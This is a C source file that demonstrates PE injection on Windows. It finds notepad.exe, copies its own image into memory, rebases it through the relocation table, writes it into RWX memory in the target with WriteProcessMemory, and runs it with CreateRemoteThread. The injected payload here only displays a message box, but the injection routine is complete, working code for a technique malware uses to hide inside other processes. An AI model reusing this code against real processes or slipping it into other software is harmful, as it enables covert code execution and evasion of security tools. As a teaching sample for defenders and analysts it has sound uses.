#include <stdio.h>
#include <windows.h>
#include <TlHelp32.h> // for Process32First/Next

#define TARGET	L"notepad.exe"

/* 
 * Structure for the 2 byte pairs denoting the patching instructions where the first 4 bits are
 * the relocation type and the remaining 12 store an offset from the RVA specified in the 
 * IMAGE_BASE_RELOCATION structure at the start of the relocation block
 */
 typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;

// Function that trget process will execute after injection (simply prints the name of the current module, hopefully notepad.exe)
DWORD InjectionEntryPoint()
{
	CHAR modName[128];
	
	GetModuleFileNameA(NULL, modName, sizeof(modName));
	MessageBoxA(NULL, modName, "Obligatory PE Injection", NULL);
	
	return 0;
}

// Iterates over processes to find target process (notepad.exe) and retrieve the PID needed later for OpenProcess()
DWORD GetTargetPID(VOID)
{
	DWORD pid = 0;
	HANDLE hSnapshot;
	PROCESSENTRY32 pe = {};

	pe.dwSize = sizeof(pe);
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
	{
		printf("CreateToolhelp32Snapshot failed - Error: %d\n", GetLastError());
		return pid;
	}

	if (Process32First(hSnapshot, &pe)) {
		do {
			if (!wcscmp(pe.szExeFile, TARGET))
			{
				pid = pe.th32ProcessID;
				break;
			}
		} while (Process32Next(hSnapshot, &pe));
	}

	CloseHandle(hSnapshot);

	return pid;
}

int main()
{
	DWORD pid = GetTargetPID();
	if (pid == 0)
	{
		printf("%ls process not found! :(\n", TARGET);
		return 1;
	}

	printf("[*] Starting PE injection on %ls(%d)\n", TARGET, pid);

	// 1. Get the image base address
	HANDLE imageBase = GetModuleHandle(NULL);
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeader->e_lfanew);

	// 2. Get size of image from PE headers
	DWORD sizeOfImage = ntHeaders->OptionalHeader.SizeOfImage;

	// 3. Allocate a block of memory for the PE
	LPVOID localImage = VirtualAlloc(NULL, sizeOfImage, MEM_COMMIT, PAGE_READWRITE);

	// 4. cCopy the image of the current process into the newly created block of memory (localImage)
	memcpy(localImage, imageBase, sizeOfImage);

	// 5. Allocate a new memory block in a remote process
	HANDLE targetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	LPVOID targetImage = VirtualAllocEx(targetProcess, NULL, sizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	// 6. Calcualte delta between memory address targetImage and imagebase
	DWORD_PTR deltaImageBase = (DWORD_PTR)targetImage - (DWORD_PTR)imageBase;

	// 7. Relocate/Rebase the PE that's stored in localImage to targetImage
	PIMAGE_BASE_RELOCATION relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)localImage + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
	PDWORD_PTR patchedAddresses;
	DWORD relocationEntriesCount = 0;
	PBASE_RELOCATION_ENTRY relocationRVA = NULL;

	while (relocationTable->SizeOfBlock > 0)
	{
		relocationEntriesCount = (relocationTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
		relocationRVA = (PBASE_RELOCATION_ENTRY)(relocationTable + 1);

		for (short i = 0; i < relocationEntriesCount; i++)
		{
			if (relocationRVA[i].Offset)
			{
				patchedAddresses = (PDWORD_PTR)((DWORD_PTR)localImage + relocationTable->VirtualAddress + relocationRVA[i].Offset);
				*patchedAddresses += deltaImageBase;
			}
		}

		relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)relocationTable + relocationTable->SizeOfBlock);
	}

	// 8. Write patched PE into the targetImage memory location
	WriteProcessMemory(targetProcess, targetImage, localImage, sizeOfImage, NULL);

	// 9. Create remote thread and point to InjectionEntryPoint function inside the PE target process
	CreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD_PTR)InjectionEntryPoint + deltaImageBase), NULL, 0, NULL);

	return 0;
}
